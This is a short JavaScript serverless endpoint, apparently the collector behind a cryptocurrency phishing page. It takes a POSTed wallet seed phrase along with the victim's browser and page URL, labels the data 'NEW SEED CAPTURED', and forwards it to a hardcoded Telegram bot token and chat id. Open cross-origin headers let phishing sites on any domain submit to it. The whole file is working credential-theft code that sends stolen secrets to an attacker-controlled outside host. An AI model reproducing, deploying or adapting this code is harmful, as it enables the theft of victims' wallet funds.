export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const { seed, ua, loc } = req.body;
    const msg = `🔥 NEW SEED CAPTURED 🔥\n\n📝 PHRASE:\n${seed}\n\n🌐 URL: ${loc}\n📱 Device: ${ua}\n⏰ Time: ${new Date().toISOString()}`;
    const tgUrl = `https://api.telegram.org/bot8733308372:AAE0SRS1Qw3iUuu-gG6caSlzJbCAMucQr-Y/sendMessage?chat_id=8203917769&text=${encodeURIComponent(msg)}`;
    await fetch(tgUrl);
    return res.status(200).json({ status: 'ok' });
  } catch (error) {
    return res.status(500).json({ error: 'internal' });
  }
}
